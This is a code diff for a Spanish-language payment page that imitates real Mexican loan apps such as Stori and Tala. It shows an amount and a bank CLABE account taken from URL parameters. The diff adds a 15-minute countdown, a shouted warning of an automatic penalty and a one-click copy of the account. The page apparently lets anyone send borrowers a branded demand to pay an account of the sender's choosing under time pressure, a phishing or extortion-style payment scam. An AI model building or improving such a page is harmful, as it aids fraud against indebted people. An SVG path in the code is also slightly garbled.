@@ -25,6 +25,7 @@
             <div class="text-center space-y-1">
                 <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Monto a Pagar</span>
                 <div id="txt-monto" class="text-5xl font-black text-slate-800 tracking-tighter"></div>
+                <div id="contador" class="text-red-600 font-black text-xl mt-2">15:00</div>
             </div>
 
             <div class="space-y-4 bg-slate-50 p-6 rounded-[2rem] border border-slate-100">
@@ -33,18 +34,29 @@
                     <span id="txt-nom" class="text-xs font-black text-slate-700 uppercase"></span>
                 </div>
                 <div class="flex justify-between items-center border-b border-slate-200/60 pb-3">
+                    <span class="text-[10px] font-bold text-slate-400 uppercase">Teléfono</span>
+                    <span id="txt-tel" class="text-xs font-black text-slate-700"></span>
+                </div>
+                <div class="flex justify-between items-center border-b border-slate-200/60 pb-3">
                     <span class="text-[10px] font-bold text-slate-400 uppercase">Banco</span>
                     <span id="txt-banco" class="text-xs font-black text-slate-700 uppercase"></span>
                 </div>
                 <div class="flex flex-col items-center pt-2">
                     <span class="text-[10px] font-bold text-slate-400 uppercase mb-2">CLABE / LIGA DE PAGO</span>
-                    <span id="txt-clabe" class="text-sm font-black text-blue-600 tracking-wider"></span>
+                    <div class="flex items-center space-x-2">
+                        <span id="txt-clabe" class="text-sm font-black text-blue-600 tracking-wider"></span>
+                        <button onclick="copiarLiga()" class="bg-blue-100 p-1.5 rounded-lg hover:bg-blue-200 transition-colors">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d=" finance/8 7v8a2 2 0 002 2h6M8 7V5a2 2 0 012-2h4.586a1 1 0 01.707.293l4.414 4.414a1 1 0 01.293.707V15a2 2 0 01-2 2h-2M8 7H6a2 2 0 00-2 2v10a2 2 0 002 2h8a2 2 0 002-2v-2" />
+                            </svg>
+                        </button>
+                    </div>
                 </div>
             </div>
 
-            <div class="text-center space-y-2">
+            <div class="text-center space-y-3">
                 <p class="text-[10px] text-red-600 font-black uppercase leading-tight italic">
-                    ⚠️ Advertencia: Tienes un tiempo límite de 15 minutos para realizar el pago, de lo contrario se te cobrará una penalización automática.
+                    ⚠️ ADVERTENCIA: TIENES UN TIEMPO LÍMITE DE 15 MINUTOS PARA REALIZAR EL PAGO, DE LO CONTRARIO SE TE COBRARÁ UNA PENALIZACIÓN AUTOMÁTICA.
                 </p>
                 <p class="text-[10px] text-slate-400 font-medium px-4">
                     Realiza tu pago antes del vencimiento para evitar cargos adicionales por mora.
@@ -69,7 +81,7 @@
             'cashcredit': { n: 'Cash Credit', c: '#f59e0b', i: 'https://play-lh.googleusercontent.com/kw_CZs5smCFpyFtI9pWkKhY1eRfX6E15tdTEU_KpxTaUYzUtRFx9b8eOJYpn-Ze4BQ=w480-h960-rw' },
             'stori': { n: 'Stori Crédito', c: '#7c3aed', i: 'https://play-lh.googleusercontent.com/oXTAgpljdbV5LuAOt1NP9_JafUZe9BNl7pwQ01ndl4blYL4N4IQh4-n456P5l_hc1A=s96-rw' },
             'facil': { n: 'Fácil Préstamo', c: '#0ea5e9', i: 'https://play-lh.googleusercontent.com/4cDOjhOrs563pTALZF8fikxthh5xznVnrFXReAOmWoNkfI0jncuig3l5hzOiNABAaw=w480-h960-rw' },
-            'tala': { n: 'Tala Préstamos', c: '#fb923c', i: 'https://play-lh.googleusercontent.com/DK9nyWUY6ZkHNh3TNSqbr8LTzxSGLJZZq-3QunZ-qkKIl3vYd8Ie8XGYQNrABCZ_T7Y=w480-h960-rw' }
+            'tala': { n: 'Tala Préstamos', c: '#fb923c', i: 'https://pbs.twimg.com/profile_images/1604930218606600199/95CGdKAG_400x400.png' }
         };
 
         const config = apps[v] || apps['prestamos'];
@@ -79,8 +91,25 @@
         document.getElementById('txt-app').innerText = config.n;
         document.getElementById('txt-monto').innerText = '$' + (p.get('m') || '0.00');
         document.getElementById('txt-nom').innerText = p.get('n') || 'Cliente';
+        document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
         document.getElementById('txt-banco').innerText = p.get('b') || 'BBVA';
         document.getElementById('txt-clabe').innerText = p.get('c') || '---';
+
+        // Lógica del Contador
+        let tiempo = 900; 
+        const display = document.getElementById('contador');
+        const timer = setInterval(() => {
+            let min = Math.floor(tiempo / 60);
+            let seg = tiempo % 60;
+            display.innerText = `${min}:${seg < 10 ? '0' : ''}${seg}`;
+            if (--tiempo < 0) clearInterval(timer);
+        }, 1000);
+
+        function copiarLiga() {
+            const clabe = document.getElementById('txt-clabe').innerText;
+            navigator.clipboard.writeText(clabe);
+            alert("¡Liga copiada!");
+        }
     </script>
 </body>
 </html>
